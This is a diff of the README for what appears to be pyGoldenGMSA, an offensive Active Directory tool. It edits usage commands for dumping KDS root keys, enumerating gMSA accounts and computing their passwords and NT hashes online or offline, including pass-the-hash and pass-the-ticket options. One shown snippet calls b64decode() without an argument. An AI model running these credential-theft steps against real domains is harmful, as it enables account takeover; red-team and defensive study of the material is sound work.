@@ -53,13 +53,13 @@ KDS root keys can be exfiltrated with high-privileged access. Multiple authentic
 
 ```bash
 # Password authentication
-python3 main.py -u '$USER@$DOMAIN' -p '$PASSWORD' -d $DOMAIN --dc-ip $DC_IP kdsinfo
+python3 main.py -u "$USER@$DOMAIN" -p "$PASSWORD" -d $DOMAIN --dc-ip $DC_IP kdsinfo
 
 # Pass-the-Hash authentication
-python3 main.py -u '$USER' -d $DOMAIN --dc-ip $DC_IP --nt-hash $NT_HASH kdsinfo
+python3 main.py -u "$USER" -d $DOMAIN --dc-ip $DC_IP --nt-hash $NT_HASH kdsinfo
 
 # Pass-the-Ticket (Kerberos) authentication
-python3 main.py -u '$USER' -d $DOMAIN --dc-ip $DC_IP --ccache admin.ccache kdsinfo
+python3 main.py -u "$USER" -d $DOMAIN --dc-ip $DC_IP --ccache admin.ccache kdsinfo
 ```
 
 The dumped KDS root keys are printed in base64, and can be used for password calculation later on.
@@ -105,10 +105,10 @@ GoldenGMSA.exe gmsainfo --sid "S-1-5-21-[...]1586295871-1112"
 
 ```bash
 # Enumerate all gMSA accounts
-python3 main.py -u '$USER@$DOMAIN' -p '$PASSWORD' -d $DOMAIN --dc-ip $DC_IP gmsainfo
+python3 main.py -u "$USER@$DOMAIN" -p "$PASSWORD" -d $DOMAIN --dc-ip $DC_IP gmsainfo
 
 # Enumerate a specific gMSA by SID
-python3 main.py -u '$USER@$DOMAIN' -p '$PASSWORD' -d $DOMAIN --dc-ip $DC_IP gmsainfo --sid "$GMSA_SID"
+python3 main.py -u "$USER@$DOMAIN" -p "$PASSWORD" -d $DOMAIN --dc-ip $DC_IP gmsainfo --sid "$GMSA_SID"
 ```
 
 The tool outputs the account name, SID, root key GUID, and indices required for password computation.
@@ -141,7 +141,7 @@ import hashlib
 
 b64 = input("Password Base64: ")
 
-print("NT hash:", hashlib.new("md4", base64.b64decode()).hexdigest())'
+print("NT hash:", hashlib.new("md4", base64.b64decode()).hexdigest())
 ```
 
 
@@ -153,17 +153,13 @@ print("NT hash:", hashlib.new("md4", base64.b64decode()).hexdigest())'
 **Online computation** (automatically retrieves KDS root key and password ID from the DC):
 
 ```bash
-python3 main.py -u '$USER@$DOMAIN' -p '$PASSWORD' -d $DOMAIN --dc-ip $DC_IP \
-    compute --sid $GMSA_SID
+python3 main.py -u "$USER@$DOMAIN" -p "$PASSWORD" -d $DOMAIN --dc-ip $DC_IP compute --sid $GMSA_SID
 ```
 
 **Offline computation** (no network access required, using previously dumped KDS root key and password ID):
 
 ```bash
-python3 main.py compute \
-    --sid $GMSA_SID \
-    --kdskey 'AQAAAOlMCM5U37Qv...<base64>...' \
-    --pwdid 'AQAAAEtEU0sC...<base64>...'
+python3 main.py compute --sid $GMSA_SID --kdskey "AQAAAOlMCM5U37Qv...<base64>..." --pwdid "AQAAAEtEU0sC...<base64>..."
 ```
 
 Unlike the Windows tool, pyGoldenGMSA outputs the NT hash directly in both NT-only format and nxc format, eliminating the need for manual hash conversion:
